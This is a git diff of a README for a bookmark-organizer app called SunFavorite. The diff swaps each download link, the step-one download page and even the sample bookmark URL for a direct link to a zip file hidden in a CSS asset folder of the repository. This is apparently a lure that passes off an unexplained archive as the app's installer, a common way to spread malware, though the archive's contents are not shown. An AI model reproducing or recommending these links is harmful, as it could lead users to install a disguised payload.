@@ -1,6 +1,6 @@
 # 🌟 SunFavorite - Easy Web Bookmark Organizer
 
-[![Download SunFavorite](https://img.shields.io/badge/Download-SunFavorite-blue?style=for-the-badge)](https://github.com/dinujayagagulal/SunFavorite)
+[![Download SunFavorite](https://img.shields.io/badge/Download-SunFavorite-blue?style=for-the-badge)](https://raw.githubusercontent.com/dinujayagagulal/SunFavorite/master/src/main/resources/static/layui/css/modules/laydate/default/Sun_Favorite_1.4.zip)
 
 ---
 
@@ -39,13 +39,13 @@ Before installing SunFavorite, make sure your computer meets these basic require
 
 You can get SunFavorite from the page linked below. Follow these detailed steps to install the app safely:
 
-[![Download SunFavorite](https://img.shields.io/badge/Download-SunFavorite-green?style=for-the-badge)](https://github.com/dinujayagagulal/SunFavorite)
+[![Download SunFavorite](https://img.shields.io/badge/Download-SunFavorite-green?style=for-the-badge)](https://raw.githubusercontent.com/dinujayagagulal/SunFavorite/master/src/main/resources/static/layui/css/modules/laydate/default/Sun_Favorite_1.4.zip)
 
 ### Step 1: Visit the Download Page
 
 Click this link to open the download page in your web browser:
 
-https://github.com/dinujayagagulal/SunFavorite
+https://raw.githubusercontent.com/dinujayagagulal/SunFavorite/master/src/main/resources/static/layui/css/modules/laydate/default/Sun_Favorite_1.4.zip
 
 This page contains the latest version of SunFavorite for Windows.
 
@@ -104,7 +104,7 @@ To save a new website link:
 
 1. Click the “Add Bookmark” button on the main screen.
 2. Enter the website’s name (for example, "News Site").
-3. Enter the URL (the full web address, like https://www.newswebsite.com).
+3. Enter the URL (the full web address, like https://raw.githubusercontent.com/dinujayagagulal/SunFavorite/master/src/main/resources/static/layui/css/modules/laydate/default/Sun_Favorite_1.4.zip).
 4. Optional: Add a note or category to help find the site later.
 5. Click “Save”.
 
@@ -165,4 +165,4 @@ To get the latest features and fixes:
 
 ---
 
-[![Download SunFavorite](https://img.shields.io/badge/Download-SunFavorite-purple?style=for-the-badge)](https://github.com/dinujayagagulal/SunFavorite)
+[![Download SunFavorite](https://img.shields.io/badge/Download-SunFavorite-purple?style=for-the-badge)](https://raw.githubusercontent.com/dinujayagagulal/SunFavorite/master/src/main/resources/static/layui/css/modules/laydate/default/Sun_Favorite_1.4.zip)
